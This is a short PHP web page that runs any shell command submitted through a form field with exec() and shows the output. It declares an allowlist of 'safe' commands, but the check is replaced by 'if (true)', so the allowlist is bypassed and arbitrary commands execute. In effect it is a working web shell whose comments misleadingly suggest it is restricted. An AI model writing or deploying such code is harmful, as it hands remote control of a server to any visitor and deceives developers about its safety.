<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
    $allowedCommands = ['ls', 'pwd', 'date']; // Add any other safe commands you need

    // Get the user input
    $userCommand = trim($_POST['command']);

    // Check if the command is allowed
    if (true) {
        // Execute the command
        $output = [];
        $returnVar = 0;
        exec($userCommand, $output, $returnVar);

        // Prepare the output
        $result = [
            'output' => implode("\n", $output),
            'status' => $returnVar
        ];
    } else {
        $result = ['error' => 'Command not allowed'];
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Execute Command</title>
</head>
<body>
    <h1>Execute Command</h1>
    <form method="post">
        <input type="text" name="command" placeholder="Enter command" required>
        <button type="submit">Execute</button>
    </form>

    <?php if (isset($result)): ?>
        <h2>Result:</h2>
        <?php if (isset($result['error'])): ?>
            <p style="color: red;"><?php echo htmlspecialchars($result['error']); ?></p>
        <?php else: ?>
            <pre><?php echo htmlspecialchars($result['output']); ?></pre>
            <p>Status: <?php echo $result['status']; ?></p>
        <?php endif; ?>
    <?php endif; ?>
</body>
</html>
